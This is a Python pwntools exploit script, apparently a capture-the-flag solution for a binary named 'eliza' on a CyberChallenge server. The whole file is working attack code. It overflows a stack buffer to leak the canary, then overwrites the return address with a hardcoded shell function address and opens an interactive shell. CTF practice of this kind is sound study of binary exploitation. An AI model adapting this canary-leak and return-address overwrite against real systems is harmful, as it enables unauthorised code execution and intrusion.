#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('eliza')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("eliza.challs.cyberchallenge.it", 6011, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak eliza
continue
'''.format(**locals())

#Idea: remove all \0 chars between the canary and the input buffer

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

shell_addr = 0x0000000000400897
addr_size = 8

io = start()

vector = cyclic(73)

io.send(vector)
io.recvuntil(vector[:-1])
canary = io.recv(addr_size)

payload = cyclic(addr_size*1) + p64(shell_addr)

io.send(vector[:-1] + b"\x00" + canary[1:] + payload)
io.send("\n")

io.interactive()

